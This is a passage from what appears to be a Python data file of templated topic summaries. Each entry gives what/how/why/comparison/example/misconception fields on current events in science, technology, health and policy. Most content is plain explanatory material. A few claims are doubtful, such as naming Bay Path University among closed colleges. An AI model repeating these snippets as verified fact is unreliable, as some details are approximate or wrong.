    "ex": "income-driven repayment under the SAVE plan (since 2023) caps payments at 5-10% of discretionary income with forgiveness after 10-25 years. PSLF (Public Service Loan Forgiveness) for government and nonprofit workers has accelerated since 2021 reforms. Approximately $150B+ in targeted forgiveness has occurred 2021-2024, even after the Supreme Court ruling",
    "mis": "people think most borrowers carry massive debts; the median is ~$20K, with the largest balances concentrated in graduate and professional students who have higher earning potential. Another myth is that all forgiveness is broad cancellation -- most has been program-based (PSLF, IDR) for specific eligible borrowers",
}
T["healthcare access disparities"] = {
    "what": "differences in access to and quality of healthcare across geographic, racial, socioeconomic, and insurance lines. In the US, ~26 million people lack health insurance; rural areas have fewer providers; race and income correlate with worse outcomes for many conditions, even controlling for other factors",
    "how": "drivers include insurance coverage (Medicaid expansion variation, employer-sponsored insurance gaps), provider concentration (rural hospital closures, specialist shortages), implicit bias and historical patterns, and social determinants (education, income, housing, food security)",
    "why": "disparities translate to measurable life expectancy gaps -- 5-15 years between US racial and geographic groups. They also drive spending inefficiency: lack of preventive care leads to expensive emergency care. Closing disparities is both a justice issue and a major economic opportunity",
    "vs": "compared with universal-coverage countries (UK, Canada, France, Japan), the US has higher costs and worse outcomes on many population health measures. Compared with insured Americans, the uninsured are more likely to delay care, accrue medical debt, and die from treatable conditions",
    "ex": "Medicaid expansion under the ACA (states that expanded saw uninsurance drop more than non-expansion states), telehealth expansion (especially since COVID, helping rural access), federally qualified health centers serving low-income patients, and community health worker programs that bridge clinical care with communities",
    "mis": "people attribute disparities purely to individual choices; structural factors (insurance, provider supply, implicit bias) explain large portions. Another myth is that 'getting insurance' fully closes gaps -- coverage helps but access requires providers, transportation, time off work, and culturally competent care",
}
T["the future of higher education"] = {
    "what": "the evolving landscape of post-secondary education in response to demographic shifts (fewer 18-year-olds entering college), cost pressures (rising tuition, student debt), value debates (degree premium vs alternative credentials), and technological change (online learning, AI tutoring)",
    "how": "trends include declining undergraduate enrollment (down ~9% since 2010), expansion of online programs, growth of alternative credentials (boot camps, micro-credentials, employer training), focus on workforce alignment, and consolidation/closure of some smaller institutions. State funding pressures and political scrutiny add complexity",
    "why": "higher education shapes individual mobility, workforce capability, and civic life. The current model faces sustainability questions: many private colleges face existential pressures from demographic decline, and public skepticism of cost and value has grown. The transition will reshape industries that depend on educated workers and universities that depend on enrollment",
    "vs": "compared with the post-WWII expansion era, the current era is one of contraction and differentiation. Compared with bachelor's degrees, alternative credentials are growing faster (Google Career Certificates, Coursera/edX programs). Compared with US patterns, European and Asian systems differ widely -- some heavily subsidized, some intensely meritocratic",
    "ex": "Bay Path University, Mills College, Cabrini University, and dozens of others have closed or merged 2020-2024. State systems consolidate (Pennsylvania, Wisconsin). Online enrollment at Western Governors and Southern New Hampshire has grown to hundreds of thousands. Tech companies created their own apprenticeship-like credentials",
    "mis": "people think the bachelor's degree is dying; for most career paths it remains valuable, with completion rates and earnings premium intact. Another myth is that all online programs are equivalent -- quality varies enormously, and outcomes depend on the specific program and student",
}

# === CURRENT_EVENTS: science / tech news ===
T["large language models and their limits"] = {
    "what": "neural networks trained on massive text corpora to predict and generate text. Models like GPT-4, Claude Opus 4.6/4.7, Gemini 2, and Llama-3 demonstrate broad capabilities -- language understanding, code generation, reasoning -- but also notable failure modes including hallucination, brittleness, and limited grounding",
    "how": "LLMs are trained on trillions of tokens via next-token prediction (pretraining), then fine-tuned with human feedback (RLHF, DPO) to follow instructions. At inference, they predict the next token given context. Frontier models combine LLMs with tools (web search, code execution) and longer context windows (200K-2M tokens) to extend their capabilities",
    "why": "LLMs power assistants (ChatGPT, Claude), copilots in coding (Cursor, GitHub Copilot), customer service, and creative tasks. They also raise serious concerns: misinformation, automation impact on jobs, AI safety alignment, and concentration of power in AI labs. Investment, capability, and societal impact have all accelerated dramatically since 2022",
    "vs": "compared with prior NLP (rule-based, classic ML), LLMs handle open-ended language tasks at human-comparable quality across most domains. Compared with humans, they lack genuine understanding, real-time perception, and reliable factual grounding -- they pattern-match very well but fabricate confidently when out of distribution",
    "ex": "Claude Opus 4.6 can write working code from a natural-language description, summarize a 100-page document, and answer complex questions across many domains. It can also confidently make up legal cases, get arithmetic wrong, and follow flawed reasoning chains. The output quality requires verification, especially for high-stakes tasks",
    "mis": "people think LLMs 'understand' or 'reason' like humans; they simulate aspects of these abilities through statistical pattern completion, with very different failure modes. Another myth is that scaling solves everything -- recent improvements come from data quality, RLHF, tool use, and architectural refinements, not just scale alone",
}
T["AI alignment research"] = {
    "what": "the field of work aiming to ensure AI systems pursue intended goals and are safe, controllable, and beneficial. As AI capabilities grow rapidly, alignment research focuses on ensuring AI behavior matches human values and intentions, especially as systems approach or exceed human-level capabilities",
    "how": "techniques include reinforcement learning from human feedback (RLHF), constitutional AI (training models with explicit principles), debate (one AI critiques another), red-teaming (finding model failures), interpretability (understanding what models 'know' internally), and scalable oversight (overseeing systems smarter than the humans overseeing them)",
    "why": "AI labs (Anthropic, OpenAI, Google DeepMind, Meta) and governments (US AISI, UK AISI) are scaling alignment work because risks scale with capability. Concerns range from immediate (misinformation, bias) to longer-term (loss of control over highly capable systems). Alignment is one of the most active research areas in AI",
    "vs": "compared with pure capabilities research (making AI smarter), alignment research aims to make AI safer and more controllable. Compared with general AI safety, alignment focuses specifically on the goal-directed behavior of AI systems. Compared with AI ethics (broader social and policy questions), alignment is more technical",
    "ex": "Anthropic's Constitutional AI: instead of relying on human labels for every response, the model is trained to critique and revise its own outputs against a set of principles. RLHF fine-tunes models on human preference data. Interpretability work like Anthropic's circuits research opens the black box of what features models use to reason",
    "mis": "people think alignment is solved by more RLHF; current techniques work for narrow tasks but don't yet provide guarantees on novel situations. Another myth is that alignment concerns are only about science-fiction AGI -- they apply directly to deployed systems today (jailbreaks, prompt injection, deceptive optimization)",
}
T["AI in drug discovery"] = {
    "what": "the use of machine learning to accelerate the discovery and development of new pharmaceuticals. AI helps identify drug targets, design molecules, predict protein structures, and prioritize compounds for synthesis and testing -- compressing what once took years into months",
    "how": "models like AlphaFold predict protein structures from amino acid sequences with accuracy approaching experimental methods. Generative models design novel molecules with desired properties. Predictive models score compounds for toxicity, bioavailability, and target binding. Active learning strategies prioritize which compounds to actually synthesize and test",
    "why": "drug discovery is famously slow (10-15 years, $2-3B average per approved drug) and high-failure (90%+ of compounds entering trials fail). Even small efficiency improvements unlock major value. AI-discovered drugs are progressing through clinical trials in 2024-2026, with several in late-stage testing",
    "vs": "compared with traditional discovery (high-throughput screening of large libraries), AI-driven design is more targeted, requiring less wet-lab work for the same hit rate. Compared with hand-design by medicinal chemists, generative AI explores wider chemical space, finding non-obvious candidates",
    "ex": "Insilico Medicine's INS018_055 (treating idiopathic pulmonary fibrosis) entered Phase 2 trials in 2024 -- one of the first AI-designed drugs to reach this stage, identified in 18 months vs typical 4-5 years. AlphaFold's predictions for 200M+ proteins (released 2022) have transformed structural biology research workflows",
    "mis": "people think AI will design drugs autonomously soon; AI is a powerful tool that augments biologists and chemists, not yet a replacement. Another myth is that AI eliminates clinical trial risk -- the biology of human response remains uncertain regardless of how the molecule was discovered",
}
T["quantum computing progress"] = {
    "what": "the development of computers that use quantum mechanical phenomena (superposition, entanglement, interference) to perform certain computations exponentially faster than classical computers. As of 2025, quantum systems have ~1000+ qubits but face severe error rates that limit useful work",
    "how": "qubits are physical systems (superconducting circuits, trapped ions, photonic, neutral atoms) that can be in superposition. Quantum gates manipulate them; measurement collapses superposition. Error correction encodes a 'logical qubit' across many physical qubits to combat noise. Useful fault-tolerant quantum computing requires millions of high-quality qubits",
    "why": "quantum computers could break current public-key cryptography (Shor's algorithm), simulate molecules for drug and materials design, optimize complex problems, and perform machine learning faster on some tasks. Major investments from Google, IBM, IonQ, Microsoft, and national governments are pushing capability",
    "vs": "compared with classical computing, quantum has theoretical advantages on specific problem classes (factoring, simulation, certain optimization) but no advantage on most tasks. Compared with the AI boom, quantum is years behind on practical impact. NISQ (noisy intermediate-scale quantum) systems exist now but offer limited practical value",
    "ex": "Google's 2024 demonstration of below-threshold error correction was a major milestone -- as more qubits encode a logical qubit, the logical error rate decreases. IBM's 1121-qubit Condor and Microsoft's qubit demonstrations push capability. Quantum supremacy claims (Google 2019, China 2020+) showed specific tasks beyond classical, but practically useful tasks remain elusive",
    "mis": "people think quantum computers will replace classical ones; they are special-purpose accelerators for specific problem classes. Another myth is that quantum is imminent for breaking encryption; current quantum hardware is many years from running Shor's algorithm at cryptographically meaningful scale",
}
T["James Webb Space Telescope discoveries"] = {
    "what": "JWST is a space telescope launched in December 2021 and operating at the L2 point. With a 6.5-meter primary mirror and four instruments operating in infrared, it observes the early universe, exoplanet atmospheres, and detailed structures in galaxies and nebulae far beyond Hubble's reach",
    "how": "the telescope's segmented mirror collects infrared light, which the instruments split into spectra or images. Operating in deep cold (sun shield blocks solar heat) reduces thermal noise. Exoplanet observations use transit spectroscopy: measuring the starlight passing through an exoplanet's atmosphere and identifying chemical signatures by their spectral lines",
    "why": "JWST has revealed surprisingly mature galaxies in the very early universe (within the first ~500 million years), challenging galaxy formation models. It's identifying complex molecules in exoplanet atmospheres (CO2, water, possibly organic molecules) -- a key step toward biosignature detection. Its data shapes cosmology, exoplanet science, and astrochemistry",
    "vs": "compared with Hubble (visible/UV optimized, smaller mirror), JWST sees far further into infrared and has 7x more collecting area. Compared with ground-based telescopes (atmospheric distortion), JWST has perfect seeing. Compared with future telescopes (LUVOIR, HabEx in 2030s), JWST is the current frontier",
    "ex": "JWST's 2024 spectrum of K2-18b (a sub-Neptune exoplanet) detected methane and carbon dioxide, possibly hinting at a 'Hycean' world with ocean and hydrogen atmosphere. Its deep-field images show fully formed galaxies just 400 million years after the Big Bang -- earlier than models predicted galaxies could fully assemble",
    "mis": "people think JWST will find aliens; it can detect potential biosignatures but interpretation is ambiguous, and life elsewhere is not confirmed. Another myth is that JWST replaces Hubble -- they observe different wavelengths and complement each other. Hubble continues operating in 2024-2026",
}
T["SpaceX and reusable rockets"] = {
    "what": "SpaceX has pioneered the routine reuse of orbital-class rockets, dramatically lowering the cost of access to space. Falcon 9 first stages now routinely land and re-fly (some boosters have flown 20+ times); Starship aims for full reusability of both stages, targeting a transformative reduction in launch cost per kg",
    "how": "Falcon 9 first stages return to landing pads or autonomous drone ships using grid fins and engine relight, with refurbishment between flights. Starship uses stainless steel construction, methalox engines (Raptor), and aerodynamic flap control during entry. The Super Heavy booster catches itself with the launch tower's mechanical 'chopstick' arms",
    "why": "reusability cuts launch cost from $50K-$70K per kg (traditional) to under $3000 (Falcon 9) and potentially under $100 (Starship target). It enables the Starlink constellation (~6500 satellites), routine cargo and crew to ISS, lunar Artemis missions, and -- as costs drop further -- much more ambitious projects",
    "vs": "compared with expendable rockets (Atlas V, Soyuz, Long March), reusable rockets reuse the most expensive components. Compared with the Space Shuttle (partially reusable but expensive), Falcon and Starship aim for genuine cost reduction through rapid turnaround. Competitors (Blue Origin, Rocket Lab, China) are catching up",
    "ex": "Falcon 9 launches 100+ times per year (most of all global launches), with first-stage recovery rates above 95%. Starship's first successful tower-catch of the Super Heavy booster in October 2024 was a milestone toward orbital reuse. Multiple Starship test flights through 2024-2026 have demonstrated reentry control and progressively complex flight profiles",
    "mis": "people think rocket reusability is solved; Falcon has it down for first stages, but Starship's full reusability is still being proven. Another myth is that reusability automatically dominates; small launchers (Rocket Lab Electron) and government programs continue with mixed approaches based on mission economics",
}
T["the Artemis lunar program"] = {
    "what": "NASA's program to return humans to the Moon and establish sustained presence as a stepping stone for Mars. Artemis I (uncrewed Orion lunar flyby, 2022) succeeded; Artemis II (crewed lunar flyby) targets 2025-2026; Artemis III (crewed lunar landing) targets 2026-2027. The first woman and first person of color are slated to land",
    "how": "the architecture uses NASA's Space Launch System (SLS) rocket and Orion spacecraft for crew transport; SpaceX's Starship Human Landing System lands astronauts on the Moon; international partners contribute Gateway lunar station modules. Planned activities include surface science, exploration of polar regions for water ice, and demonstrations of long-duration habitation",
    "why": "Artemis aims to develop technology and operational experience for Mars missions, secure US leadership in space exploration with allies (Artemis Accords now have 50+ signatories), and explore lunar resources. The program has bipartisan support but faces schedule pressure, technical challenges, and budget scrutiny",
    "vs": "compared with Apollo (1969-1972, brief flag-and-footprints visits), Artemis aims for sustained presence, with more diverse crews and international partnership. Compared with private Mars proposals (SpaceX), Artemis is government-led with multinational coordination. Compared with China's lunar program (Chang'e robotic missions, planned crewed in 2030), Artemis is racing to establish norms and infrastructure first",
    "ex": "Artemis I (Nov 2022): SLS launched successfully, Orion completed a 26-day mission including a distant lunar orbit, and reentry/recovery worked as designed. Artemis II crew (Wiseman, Glover, Koch, Hansen) is preparing for the first crewed mission, scheduled to launch in 2025-2026 pending readiness reviews",
    "mis": "people think Artemis is mostly about the Moon; the deeper purpose is technology development for Mars, not just lunar return. Another myth is that the program is on smooth track -- delays, cost growth, and HLS readiness pressures are real, and the schedule has slipped multiple times",
}
T["mRNA vaccine platforms"] = {
    "what": "vaccine platforms that deliver messenger RNA encoding a pathogen antigen, instructing the patient's cells to produce that antigen and trigger an immune response. mRNA vaccines proved transformative during COVID-19 (Pfizer-BioNTech, Moderna) and are now developed for many other indications",
    "how": "the mRNA is encapsulated in lipid nanoparticles that protect it and enable cellular uptake. Inside cells, ribosomes translate the mRNA into the target protein (e.g., SARS-CoV-2 spike). The immune system recognizes the protein, generates antibodies and T cells. The mRNA degrades within days; immune memory persists",
    "why": "mRNA platforms allow rapid design and manufacturing -- weeks from sequence to clinical material vs months/years for traditional vaccines. They proved able to scale production to billions of doses globally during COVID. Programs are now developing mRNA vaccines for influenza, RSV, cancer (personalized therapeutic vaccines), and other pathogens",
    "vs": "compared with protein-subunit vaccines (Novavax COVID), mRNA vaccines induce both antibody and T-cell responses without needing protein production infrastructure. Compared with viral vector vaccines (J&J, AstraZeneca), mRNA doesn't trigger anti-vector immunity that limits boosting. Each platform has tradeoffs in storage, scalability, and immune profile",
    "ex": "Moderna's individualized cancer vaccine for melanoma (with Merck's Keytruda) showed in Phase 2 trials that combination therapy reduced recurrence/death risk by ~44% vs Keytruda alone. The vaccine encodes ~34 patient-specific neoantigens designed from the tumor's mutations. Phase 3 trials are ongoing",
    "mis": "people think mRNA vaccines change DNA; mRNA stays in the cytoplasm and is degraded after use, never entering the nucleus. Another myth is that mRNA technology is brand new -- research goes back to the 1990s; COVID-19 was the first major application at scale, not the technology's invention",
}
T["Alzheimer's drug development"] = {
    "what": "the search for therapies that slow, halt, or reverse Alzheimer's disease, the most common cause of dementia. Recent advances target amyloid plaques (lecanemab, donanemab) and offer modest benefits in early disease, after decades of failed trials. Newer approaches target tau, inflammation, and other pathways",
    "how": "lecanemab (Leqembi, approved 2023) and donanemab (Kisunla, approved 2024) are antibody therapies that bind and clear amyloid plaques in the brain. Trials show ~25-35% slowing of cognitive decline over 18 months in early symptomatic patients. Treatment requires periodic infusions and brain scans to monitor for amyloid-related imaging abnormalities (ARIA) -- a side effect involving brain swelling or microbleeding",
    "why": "Alzheimer's affects ~6 million Americans (~50 million globally), with no prior disease-modifying therapies. The recent approvals validate the amyloid hypothesis, opening more research investment. Even modest slowing has meaningful effects on independence and caregiving burden, though the benefits and risks are debated",
    "vs": "compared with prior amyloid-targeting drugs (aducanumab, controversial 2021 approval), lecanemab and donanemab show clearer cognitive benefits in trials. Compared with symptomatic treatments (cholinesterase inhibitors), the new drugs target the underlying disease mechanism. Compared with future-stage therapies (early prevention, combination approaches), current drugs are limited to early symptomatic patients",
    "ex": "lecanemab in CLARITY-AD trial: 1795 patients with mild cognitive impairment or mild Alzheimer's, 18 months. The drug slowed decline on the CDR-SB scale by ~27%. ARIA occurred in ~21% of treated patients (mostly mild). Patients on apolipoprotein E4 alleles had higher ARIA risk, requiring careful patient selection and monitoring",
    "mis": "people think Alzheimer's drugs reverse the disease; current treatments slow progression in early stages, not reverse it. Another myth is that everyone with cognitive complaints is a candidate -- treatments require confirmed amyloid biology and early-stage diagnosis, which are not universal among dementia patients",
}
T["personalized medicine and genomics"] = {
    "what": "the practice of tailoring medical treatment to individual patients based on their genetic, molecular, and clinical characteristics. Genomics enables precision diagnosis (genetic causes of disease), prognosis (risk stratification), and treatment selection (targeted therapies, dose optimization)",
    "how": "whole-genome or whole-exome sequencing identifies disease-relevant variants. Pharmacogenomics matches drug choice and dose to genetic markers (e.g., warfarin dosing, clopidogrel response). In cancer, tumor sequencing identifies actionable mutations targetable by specific drugs (HER2 in breast cancer, BRAF in melanoma, EGFR in lung cancer)",
    "why": "personalized approaches have transformed oncology, rare disease care, and pharmacology, with growing application in cardiology, psychiatry, and many other fields. Sequencing costs have dropped from $100M (2001) to under $200 (2024), enabling clinical-grade genomes affordably. The 100,000 Genomes Project, All of Us, and similar initiatives build research foundations",
    "vs": "compared with one-size-fits-all medicine, personalized approaches improve efficacy, reduce side effects, and match cost to benefit. Compared with simple genetic tests, comprehensive genomic profiling captures more information at the cost of complexity (variants of uncertain significance, ethical issues with incidental findings)",
    "ex": "in lung cancer, EGFR-mutant tumors respond dramatically to EGFR inhibitors (osimertinib) -- 2-3 year progression-free survival vs months with chemotherapy. CAR-T cell therapies engineer a patient's own T cells to attack their cancer (Kymriah, Yescarta), curing some lymphomas and leukemias previously fatal",
    "mis": "people think genomic testing tells your future precisely; most variants confer modest risk, with environment and behavior remaining important. Another myth is that personalized medicine is universally available -- access is uneven by geography, insurance, and economic status, with significant disparities in who benefits",
}
T["brain-computer interfaces"] = {
    "what": "devices that establish direct communication between the brain and external systems. BCIs read neural activity to control prosthetics, computers, or communication devices, and increasingly write back via stimulation. They serve patients with paralysis, ALS, severe sensory loss, and may enable broader applications",
    "how": "invasive BCIs (Neuralink, BrainGate, Synchron) implant electrodes that record from many neurons. Decoders translate neural firing patterns into commands. Non-invasive BCIs (EEG, fNIRS) read scalp signals -- safer but lower resolution. Recent advances in machine learning have dramatically improved decoding accuracy",
    "why": "BCIs could restore communication and movement for people with paralysis, ALS, or stroke. Speech BCIs decoding intended speech at ~60-80 words per minute have transformed communication for ALS patients. Motor BCIs let paralyzed individuals control robotic arms and cursors. Long-term, BCIs may enable broader human-computer interaction",
    "vs": "compared with non-invasive BCIs, invasive BCIs (Utah arrays, Neuralink threads) provide much higher signal quality but require neurosurgery. Compared with assistive technologies (eye trackers, switch scanning), BCIs offer faster, more natural interaction. Compared with whole-brain interface visions, current BCIs are localized -- a tiny portion of motor cortex or speech areas",
    "ex": "Neuralink's first human implant (Noland Arbaugh, 2024) restored mouse-cursor control for a quadriplegic patient -- the patient plays chess and uses social media via thought alone. Synchron's Stentrode (a stent-electrode delivered via blood vessel, less invasive than open surgery) is in clinical trials. BrainGate has decades of decoded motor and speech results",
    "mis": "people think BCIs read thoughts; they decode specific neural signals (intended movement, intended phonemes) but cannot read general thoughts. Another myth is that consumer BCIs are imminent -- medical applications for severe disability are advancing, but mass-market 'thought-control' devices remain distant",
}
T["the search for extraterrestrial life"] = {
    "what": "scientific efforts to detect life beyond Earth, ranging from microbial life on Mars or icy moons to technological civilizations elsewhere in the galaxy. Methods include in-situ exploration of Mars and ocean worlds, exoplanet atmosphere spectroscopy, and SETI radio searches",
    "how": "robotic missions (Perseverance, Curiosity, Europa Clipper, Dragonfly to Titan) sample Mars and other worlds for biosignatures. JWST and future telescopes (HWO, ELT) measure exoplanet atmospheres for combinations of gases (oxygen, methane) hard to explain without life. SETI scans for narrowband radio signals or laser pulses with engineered signatures",
    "why": "discovering even microbial life elsewhere would transform our understanding of biology and the universe. Detection of intelligent life would be even more profound. The search informs astrobiology, planetary science, and origin-of-life research, and inspires public interest in space exploration",
    "vs": "compared with finding fossil microbes in Mars samples (current approach), detecting present-day life in ocean worlds (Europa, Enceladus) or atmospheric biosignatures on exoplanets are complementary searches. Compared with SETI for technosignatures, biosignature search is more agnostic about what life looks like",
    "ex": "Perseverance has cached samples for return to Earth (Mars Sample Return mission planned late 2020s/early 2030s) where labs can analyze for biosignatures. JWST's exoplanet observations identify candidate worlds for follow-up. Europa Clipper (launched 2024, arrives 2030) will study Europa's icy shell and subsurface ocean potential",
    "mis": "people think SETI has been searching exhaustively; it has searched a tiny fraction of stars and frequencies, with limited resources. Another myth is that we'd know immediately if signals were detected -- candidate signals require careful verification and are routinely produced by terrestrial interference",
}
T["asteroid deflection planetary defense"] = {
    "what": "the scientific and engineering challenge of detecting and deflecting asteroids or comets that could impact Earth. NASA's Planetary Defense Coordination Office tracks near-Earth objects; the DART mission demonstrated kinetic deflection in 2022, and follow-on missions are studying Earth-bound risks",
    "how": "telescopes (Pan-STARRS, ATLAS, Catalina, future NEO Surveyor) catalog asteroids 140m+. Deflection options include kinetic impactors (the DART approach: hit the asteroid hard enough to change its orbit), gravity tractors (slow gravitational tug over years), nuclear devices (controversial, last resort for short-warning threats), and ion beam deflection",
    "why": "while large impacts are rare on human timescales, smaller impacts (Chelyabinsk 2013, Tunguska 1908) damage cities. Larger impacts could have continental or civilization-level consequences. The DART success showed deflection is technically feasible with sufficient warning. Planetary defense is the only known existential threat we can completely prevent given resources and time",
    "vs": "compared with adapting to natural disasters, planetary defense aims to prevent the disaster entirely -- one of few existential risks we can address. Compared with other space programs, planetary defense has bipartisan support and modest funding requirements. Compared with science-fiction depictions, real deflection works decades in advance via small course changes, not last-minute heroics",
    "ex": "DART (2022) impacted asteroid Dimorphos at 6.6 km/s, changing its orbit around Didymos by 33 minutes -- many times the predicted minimum. The Hera mission (launched 2024, arrives 2026) will study the impact site in detail. NEO Surveyor (launching 2027) will catalog 90% of 140m+ near-Earth asteroids",
    "mis": "people think a Hollywood-style nuclear destruction is the plan; NASA approaches favor deflection (small course changes years in advance) over destruction. Another myth is that we have detected all dangerous asteroids -- the catalog of objects 140m+ is ~40% complete; most discoveries are made by automated surveys",
}
T["solar geoengineering"] = {
    "what": "proposals to reflect a small percentage of incoming sunlight to cool the planet, potentially offsetting some greenhouse gas warming. Approaches include stratospheric aerosol injection (mimicking volcanic eruptions), marine cloud brightening, and space-based reflectors. The field is controversial and largely confined to research",
    "how": "stratospheric aerosol injection would deliver sulfate or other particles to the stratosphere via aircraft, balloons, or other delivery methods. The particles reflect ~1% of sunlight, reducing temperature globally. Marine cloud brightening sprays sea-salt particles into low marine clouds to make them more reflective. Both are physically feasible but raise enormous governance and risk questions",
    "why": "if greenhouse gas reductions prove insufficient, solar geoengineering could in principle limit warming faster than emission cuts alone. It is also one of few options to prevent specific tipping points (Arctic ice loss, ice-sheet melt). Critics warn of moral hazard, deployment risks, governance gaps, and potential weather disruption",
    "vs": "compared with mitigation (reducing emissions), geoengineering doesn't address ocean acidification or other CO2-driven harms. Compared with carbon dioxide removal (DAC, BECCS), geoengineering masks the problem rather than fixing it. Termination shock (sudden warming if deployment stops) is a major risk unique to active intervention",
    "ex": "the SCOPEX project (Harvard) was planned for limited stratospheric experiments using small balloons; it was paused in 2021 due to opposition from indigenous communities and environmental groups. Most current research uses computer modeling. Mexico banned solar geoengineering experiments in 2023 after Make Sunsets (a startup) released sulfur dioxide there",
    "mis": "people think solar geoengineering is being deployed; it is at research stage with no operational programs. Another myth is that it would solve climate change -- it could mask warming temporarily but doesn't address CO2 buildup or its non-temperature effects, and creates new risks of its own",
}
T["the Voyager probes"] = {
    "what": "two NASA spacecraft (Voyager 1 and 2) launched in 1977 that have explored the outer planets and now travel through interstellar space. Voyager 1 is humanity's most distant artifact, over 24 billion km (162 AU) from Earth as of 2025, transmitting data back as it ages",
    "how": "the probes used gravitational slingshots from Jupiter, Saturn, Uranus, and Neptune to gain speed and trajectory. Plutonium-238 RTGs power them. Operating in the cold dark of interstellar space at ~38,000 km/h relative to the Sun, they communicate with Earth via the Deep Space Network -- signals taking ~22 hours one way to/from Voyager 1",
    "why": "Voyager I and II revolutionized our understanding of the outer solar system, providing close-up views and data that no mission has matched. They confirmed the heliopause boundary marking the edge of the Sun's influence (Voyager 1 in 2012, Voyager 2 in 2018). They carry the Golden Record, a message to any civilization that might find them",
    "vs": "compared with newer missions (New Horizons, Cassini, Juno), Voyagers have less sophisticated instruments but unique reach into interstellar space. Compared with future interstellar probes (Breakthrough Starshot concepts), Voyagers are 1970s technology that has lasted 47+ years and counting -- a remarkable engineering achievement",
    "ex": "Voyager 1's 2024 communication issues were resolved by JPL engineers reprogramming its 46-year-old memory remotely. The probe's RTGs power output declines ~4 W/year; instruments are being shut down progressively to extend mission life. Both probes are expected to operate at minimal capacity into the late 2020s before going silent",
    "mis": "people think the Voyagers have left the solar system; they have crossed the heliopause but the Oort Cloud (the gravitationally bound edge) extends thousands of AU further. Another myth is that they're aimed at specific stars -- their trajectories are roughly toward general directions, with closest approaches to particular stars in tens of thousands of years",
}
T["global pandemic preparedness"] = {
    "what": "the systems, infrastructure, and policies aimed at preventing, detecting, and responding to disease outbreaks with pandemic potential. After COVID-19, major reforms include the WHO Pandemic Agreement (negotiated 2024), expanded surveillance, and accelerated vaccine platforms",
    "how": "preparedness includes pathogen surveillance (One Health approach, monitoring wildlife and livestock), rapid vaccine development capacity (mRNA and other platforms), stockpiled medical countermeasures, hospital surge capacity, and international cooperation frameworks. Detection systems use genomic sequencing, wastewater monitoring, and clinical surveillance",
    "why": "COVID-19 caused millions of deaths and trillions in economic damage despite imperfect preparedness. Future pandemics could be worse -- more transmissible or more lethal pathogens are biologically possible. Investment in preparedness has high return: a few billion in surveillance and vaccine R&D dwarfs the cost of poor response",
    "vs": "compared with reactive response (waiting for outbreaks), preparedness saves lives and money. Compared with isolated national efforts, coordinated global preparedness handles the inherently borderless nature of infectious disease. Compared with pre-COVID levels, post-2020 investment in pandemic preparedness has grown but remains uneven",
    "ex": "wastewater surveillance now tracks SARS-CoV-2, polio, and other pathogens in major cities globally -- early warning that often precedes clinical detection. CEPI's 100 Days Mission targets vaccine development within 100 days of new pathogen identification, building on COVID's mRNA success. The WHO Pandemic Agreement (2024) establishes new sharing and response obligations",
    "mis": "people think COVID was a once-in-a-century event; major outbreaks have occurred regularly (1918 flu, 1957 Asian flu, 1968 Hong Kong flu, 2009 H1N1, COVID), with intervals of decades, not centuries. Another myth is that preparedness is wasted in normal times -- it requires sustained investment to maintain readiness",
}
T["antibiotic resistance crisis"] = {
    "what": "the rise of bacteria resistant to antibiotics, threatening the foundation of modern medicine. Antimicrobial resistance was associated with ~1.27 million deaths in 2019 (Lancet study) and projected to cause 10 million annual deaths by 2050 if unaddressed. Drivers include overuse in healthcare and agriculture and slow development of new antibiotics",
    "how": "bacteria evolve resistance through mutation and horizontal gene transfer (sharing resistance genes via plasmids). Selection pressure from antibiotic use favors resistant strains. Resistance genes spread between bacteria and across geographies via global trade and travel. Hospitals are reservoirs for multi-drug-resistant organisms",
    "why": "without effective antibiotics, common infections become deadly, surgery and chemotherapy become much riskier, and medical progress reverses. Pneumonia, sepsis, urinary infections, and surgical site infections all depend on antibiotics. The pipeline of new antibiotics has been slow, with most major pharmaceutical companies exiting the field due to weak economics",
    "vs": "compared with other public health threats, antimicrobial resistance is slow-moving and abstract -- harder to mobilize response. Compared with pandemic infectious disease, AMR is chronic and incremental. Compared with historical pre-antibiotic mortality, resistance threatens to roll back gains established since the 1940s",
    "ex": "carbapenem-resistant Enterobacteriaceae (CRE), MRSA, drug-resistant tuberculosis, and gonorrhea with reduced antibiotic options are growing concerns. India and other countries face especially high resistance rates. New antibiotics like cefiderocol target some resistant infections but are expensive and reserved for last-resort use",
    "mis": "people think antibiotic resistance is only a hospital issue; community spread is also significant. Another myth is that you can outpace resistance with new antibiotic development -- nothing in the pipeline matches the breadth of currently used antibiotics, and stewardship is essential",
}
T["food security in a warming world"] = {
    "what": "the challenge of feeding a growing population (projected 10 billion by 2050) on a warming, more variable climate. Climate change disrupts crop yields, water availability, and growing seasons; demands rise with population and dietary shifts; geopolitical disruptions (Ukraine war) affect grain markets dramatically",
    "how": "adaptation includes drought-tolerant crop varieties (CGIAR breeding programs), precision agriculture (variable rate inputs, satellite monitoring), shifting cropping patterns to match new climates, irrigation efficiency, and reduced food waste (~30% of food currently lost). Mitigation includes lower-emission agriculture (regenerative practices, improved livestock management)",
    "why": "food insecurity affects ~700 million people acutely and ~2 billion experience moderate insecurity. Climate change threatens to worsen this in vulnerable regions while disrupting global grain markets that buffer local shocks. The Ukraine war's impact on wheat and fertilizer markets in 2022-2023 illustrated systemic vulnerabilities",
    "vs": "compared with the Green Revolution (1960s-90s yield gains), current challenges are more complex -- climate variability, environmental constraints, dietary shifts. Compared with autarkic approaches, global trade buffers regional shocks but creates other vulnerabilities (concentrated suppliers, shipping disruptions)",
    "ex": "wheat exports from Ukraine and Russia (~30% of global trade) were disrupted by the 2022 war, spiking prices globally and causing food crises in import-dependent countries (Egypt, Lebanon, much of Africa). The Black Sea Grain Initiative partially restored exports until Russia exited in 2023. Diversifying supply remains a long-term challenge",
    "mis": "people think technology alone solves food security; production has kept up with population so far, but distribution, conflict, and waste are equal or larger drivers of insecurity. Another myth is that going vegan globally would solve it -- dietary shifts help, but local diets, soil quality, and economics matter enormously",
}
T["water scarcity hotspots"] = {
    "what": "regions where water demand exceeds sustainable supply, leading to depleted groundwater, dried-up rivers, and strained ecosystems. Major hotspots include the Middle East (Iran, Iraq, Saudi Arabia), parts of India, the US Southwest (Colorado River basin), Mexico City, North Africa, and many parts of Africa",
    "how": "drivers include over-extraction of aquifers (groundwater pumping faster than recharge), changing precipitation patterns from climate change, growing populations and economies, and inefficient use (~70% of water goes to agriculture, much wasted). Water scarcity often manifests as falling water tables, salinization, and conflict over rivers crossing borders",
    "why": "water scarcity affects food production, public health, urban viability, and political stability. Migration from water-stressed regions is rising. Trans-boundary disputes (Nile, Tigris-Euphrates, Indus, Mekong, Colorado) create geopolitical friction. Investment in efficiency, reuse, and desalination is accelerating",
